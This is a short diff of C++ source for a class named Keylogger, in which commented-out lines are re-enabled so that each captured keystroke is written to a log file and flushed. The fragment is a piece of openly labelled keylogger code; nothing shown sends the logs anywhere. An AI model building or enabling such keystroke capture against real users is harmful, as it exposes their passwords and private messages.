@@ -195,10 +195,8 @@ void Keylogger::get_key(std::ofstream &file_logs)
 #ifdef DEBUG
 			printf("Key = %s (%d)\n", key.c_str(), c);
 #endif
-			//file_logs << key;
-			//file_logs.flush();
-
-			//lastc = c;
+			file_logs << key;
+			file_logs.flush();
 		}
 	}
 }
